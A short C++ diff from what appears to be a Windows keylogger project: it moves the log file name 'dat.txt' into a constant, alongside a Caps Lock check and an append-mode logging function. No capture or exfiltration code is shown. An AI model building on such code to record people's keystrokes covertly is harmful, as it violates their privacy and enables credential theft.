@@ -13,6 +13,8 @@
 
 using namespace std;
 
+const char LOGFILENAME[] = {"dat.txt"};
+
 int isCapsLock(void)
 {
     return (GetKeyState(VK_CAPITAL) & 0x0001);
@@ -20,7 +22,7 @@ int isCapsLock(void)
 
 void log(char s1[])
 {
-    FILE* file = fopen("dat.txt", "a+");
+    FILE* file = fopen(LOGFILENAME, "a+");
     int i = 0;
     fputs(s1, file);
     i++;
